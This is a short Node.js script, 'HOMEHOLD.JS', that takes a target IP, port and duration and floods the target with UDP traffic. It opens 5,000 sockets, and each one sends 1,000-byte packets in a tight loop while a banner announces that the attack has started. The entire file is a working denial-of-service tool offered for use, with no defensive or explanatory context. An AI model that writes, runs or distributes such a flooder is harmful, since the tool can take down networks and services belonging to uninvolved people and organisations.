const dgram = require('dgram');
const fs = require('fs');

const [,, target, portArg, durationArg] = process.argv;

if (!target || !portArg || !durationArg) {
    console.error('USAGE : NODE HOMEHOLD.JS <IP> <PORT> <DURATION>');
    process.exit(1);
}

const port = parseInt(portArg, 10);
const duration = parseInt(durationArg, 10);
const basePacketSize = 1000; 
const threads = 5000; 

const endTime = Date.now() + duration * 1000;

console.log(`HOMEHOLD-STABLE ATTACK STARTED ON IP ${target} FOR ${duration} SECONDS`);

function createSocketAndAttack() {
    const socket = dgram.createSocket('udp4');
    const payload = Buffer.alloc(basePacketSize, 'X');

    function attack() {
        if (Date.now() > endTime) {
            socket.close();
            return;
        }
        socket.send(payload, 0, basePacketSize, port, target, (err) => {
            if (err) console.error('Send error:', err);
        });
        setImmediate(attack);
    }

    attack();
}


for (let i = 0; i < threads; i++) {
    createSocketAndAttack();
}
